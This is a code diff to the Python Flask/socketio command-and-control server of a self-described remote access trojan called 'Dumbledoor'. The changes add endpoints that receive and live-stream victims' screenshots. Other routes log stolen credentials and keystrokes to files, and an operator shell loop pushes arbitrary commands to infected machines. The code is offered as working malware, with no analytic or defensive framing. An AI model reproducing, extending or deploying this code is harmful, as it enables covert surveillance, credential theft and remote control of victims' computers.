@@ -8,6 +8,7 @@ import base64
 from time import sleep
 import os
 import random
+import time
 import socketio
 import json
 import requests
@@ -22,9 +23,10 @@ about = '''
 Dumbledoor by posydon
 Created using socketio and Flask, as a replacement for Dobby, the best RAT of all time
 Use with caution!
-“Happiness can be found in the darkest of times, if one only remembers to turn on the light.”(Dumbledoor)
+“Happiness can be found in the darkest of times, if one only remembers to turn on the light.” - Dumbledoor
 https://github.com/p0syd0n/dumbledoor
 https://github.com/p0syd0n/snape
+https://github.com/p0syd0n/dumbledoor-panel
 '''
 limiter = Limiter(
   app, default_limits=["100000 per day", "150000 per hour", "250 per second"])
@@ -46,26 +48,45 @@ def ip_lookup(ip):
     print(f"{key}: {response_ipinfo[key]}")
 
 
-def generate_screen_feed(image_bytes):
-  while True:
-    buffer = BytesIO(image_bytes)
-    screenshot = Image.open(buffer)
-    buffer = BytesIO()
-    screenshot.save(buffer, 'JPEG', quality=80)
-    buffer.seek(0)
-    yield (b'--frame\r\n'
-           b'Content-Type: image/jpeg\r\n\r\n' + buffer.read() + b'\r\n')
+@app.route('/screen-feed', methods=['POST'])
+def save_file():
+    file = request.files['file']
+    id = request.args.get('id')
+    #print(id)# Retrieve the value of the 'id' query parameter
 
+    if file and id:
+        file.save(f"endpoint/screen_feed/file_screen_{id}.jpg")  # Save the file with the dynamic file name
+        return 'File saved successfully.'
+    else:
+        return 'No file received or missing id parameter.'
 
-@app.route('/screen-feed', methods=['POST', 'GET'])
-def screen_feed():
-  return Response(generate_screen_feed(request.data),
-                  mimetype='multipart/x-mixed-replace; boundary=frame')
+@app.route('/feed')
+def index():
+    return render_template('feed.html')  # Provide your own HTML template for displaying the live feed
 
+@app.route('/test')
+def test_page():
+    return render_template('test.html')  # Provide your own HTML template for displaying the live feed
+
+@app.route('/live-feed')
+def live_feed():
+    id = request.args.get('id')# Retrieve the value of the 'id' query parameter
+    def generate__(id):
+        while True:
+            with open(f"endpoint/screen_feed/file_screen_{id}.jpg", 'rb') as image_file:
+                yield (b'--frame\r\n'
+                       b'Content-Type: image/jpeg\r\n\r\n' + image_file.read() + b'\r\n\r\n')
+            # Wait for a short period of time before serving the next image
+            time.sleep(0.1)
+
+    if id != 'null':
+        return Response(generate__(id), mimetype='multipart/x-mixed-replace; boundary=frame')
+    else:
+        return 'Missing id parameter.'
 
 @app.route('/recieve_creds')
 def recieve_creds():
-  log('creds')
+  log(f"\ncreds: {request.args['data']}")
   with open('endpoint/creds.txt', 'a') as file:
     file.write(f"\ncreds: {request.args['data']}")
     file.close()
@@ -74,7 +95,9 @@ def recieve_creds():
 
 @app.route('/')
 def hello_world():
-  return 'success'
+  return '''
+success
+'''
 
 @app.route('/api')
 def api():
@@ -93,30 +116,14 @@ def api():
         'id': request.args['id'],
         'api': True
       }
-      print(command_data)
       socketio.emit('command', data=command_data)
       return '200'
     case _:
       return '400: No such api command'
-
-  
-
-  
-  
-  #   command_data = {
-  #     'repeat': command_dict_recieved['repeat'],
-  #     'command': command_dict_recieved['command'],
-  #     'param1': command_dict_recieved['param1'],
-  #     'param2': command_dict_recieved['param2'],
-  #     'param3': command_dict_recieved['param3'],
-  #     'param4': command_dict_recieved['param4'],
-  #     'id': command_dict_recieved['id']
-  #     }
   
 @app.route('/mp3')
 def get_mp3():
   return send_file('file.mp3', as_attachment=True)
-
 
 @app.route('/keys', methods=['POST'])
 def keys():
@@ -124,7 +131,6 @@ def keys():
   key = data['keys']
   with open('endpoint/keys/keys.txt', 'a') as file:
     file.write(key)
-
 
 @app.route('/upload', methods=['POST'])
 def upload():
@@ -162,7 +168,7 @@ def shell():
           if spell == 'info':
             print(f'\nInfo on {elder_wand}')
             for key2 in connected[key]:
-              print(connected[key][key2])
+              print(key2+": "+connected[key][key2])
             else:
               continue
           elif spell == 'shell':
@@ -171,7 +177,7 @@ def shell():
               if command == 'END':
                 break
               else:
-                command_data = {'command': command, 'id': elder_wand}
+                command_data = {'command': command, 'id': elder_wand, 'api': 'False'}
                 socketio.emit('shell', command_data)
                 sleep(3)
           elif spell == 'curse':
@@ -180,27 +186,36 @@ def shell():
               if specs == 'END':
                 break
               else:
-
                 split_specs = specs.split()
                 try:
-                  param1 = split_specs[2]
+                  repeat = split_specs[0]
+                except:
+                  print("whats the repeat you donkey")
+                  break
+                try:
+                  command = split_specs[1]
+                except:
+                  print("what's the command dumbfuck")
+                  break
+                try:
+                  param1 = split_specs[2].replace("`", " ")
                 except:
                   param1 = None
                 try:
-                  param2 = split_specs[3]
+                  param2 = split_specs[3].replace("`", " ")
                 except:
                   param2 = None
                 try:
-                  param3 = split_specs[4]
+                  param3 = split_specs[4].replace("`", " ")
                 except:
                   param3 = None
                 try:
-                  param4 = split_specs[5]
+                  param4 = split_specs[5].replace("`", " ")
                 except:
                   param4 = None
                 command_data = {
-                  'repeat': split_specs[0],
-                  'command': split_specs[1],
+                  'repeat': repeat,
+                  'command': command,
                   'param1': param1,
                   'param2': param2,
                   'param3': param3,
@@ -212,13 +227,12 @@ def shell():
                 socketio.emit('command', data=command_data)
                 #removed specific SID sending: room=connected[key]['sid']
                 sleep(3)
-
           elif spell == 'END':
             break
 
     if elder_wand == 'list':
       for key in connected:
-        print(key)
+        print(f"{key}: {connected[key]['username']}")
         print(f'total: {len(connected)}')
     elif elder_wand == 'about':
       print(about)
@@ -263,6 +277,7 @@ def message(json):
 def clear_cache():
   global connected
   connected = {}
+  log('cleared')
   socketio.emit('api_response', data={'id': 'SERVER', 'output': 'cache cleared'})
   
 @socketio.on('online_check')
@@ -272,6 +287,7 @@ def online_check():
 
 @socketio.on('api_start_command')
 def api_start_command(data):
+  print(data)
   if data['type'] == 'shell':
     command_data = {'id': data['id'], 'command': data['command'], 'api': data['api']}
     socketio.emit('shell', data=command_data)
@@ -331,4 +347,7 @@ def get_clients():
   # convert the dictionary keys to a list and return it
   return {'clients': list(clients)}
 
-socketio.run(app, host='0.0.0.0', port=8080, allow_unsafe_werkzeug=True)
+shell_thread = threading.Thread(target=shell)
+shell_thread.start()
+
+socketio.run(app, host='0.0.0.0', port=8080)
